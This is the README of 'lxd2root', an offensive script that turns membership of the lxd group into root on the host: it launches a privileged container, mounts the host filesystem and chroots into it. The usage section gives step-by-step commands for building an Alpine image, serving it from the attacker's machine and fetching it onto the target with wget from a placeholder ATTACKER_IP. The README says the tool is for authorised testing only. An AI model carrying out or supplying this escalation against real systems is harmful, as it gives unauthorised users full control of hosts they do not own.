# lxd2root — LXD/LXC Privilege Escalation Helper

### Automates the classic “in-lxd-group ⇒ root” escalation using a privileged LXD container to mount the host filesystem and chroot.

## ⚠️ Legal / Ethics

This tool is for educational and authorized security testing only. Use it only on machines you own or have written permission to test. The author(s) are not responsible for misuse or damage.
## What it does (TL;DR)

If your user is a member of the lxd group (or can add themselves to it), you can create a privileged LXD container, attach the host root (/) into the container, and then chroot into the mounted host filesystem as root.

This script automates:

Importing a minimal Linux image (Alpine by default) into LXD.

Ensuring an LXD storage pool/profile exists (creating one if needed).

Launching a privileged container.

Attaching the host root (/) into the container at /mnt/root.

Dropping you into a chroot on the host filesystem as root.

# usage
## 📦 Preparing the Alpine Image

Before you can use the exploit, you’ll need an Alpine Linux container image (.tar.gz) that LXD can import.

### 1. Build an Alpine image

Clone the lxd-alpine-builder repository and build an image:
```
git clone https://github.com/saghul/lxd-alpine-builder.git
cd lxd-alpine-builder
sudo ./build-alpine
```
If the build completes successfully, you’ll get a file like:
`
alpine-v3.13-x86_64-20210218_0139.tar.gz
`
This is the image your exploit script needs.
### 2. Transfer the image to the target

You need to move that .tar.gz file onto the target machine.
One quick way is to host it with a Python HTTP server on your attacker machine:
```
cd lxd-alpine-builder
python3 -m http.server
```
Then, from the target machine, download the image with:
```
wget http://<ATTACKER_IP>:8000/alpine-v3.13-x86_64-20210218_0139.tar.gz
```
Replace <ATTACKER_IP> with the IP address of your attacker machine.
### 3. Run the exploit

Once the image is on the target, simply run the script:
```
bash lxd2root.sh
```
If successful, you’ll be dropped into the host filesystem as root.
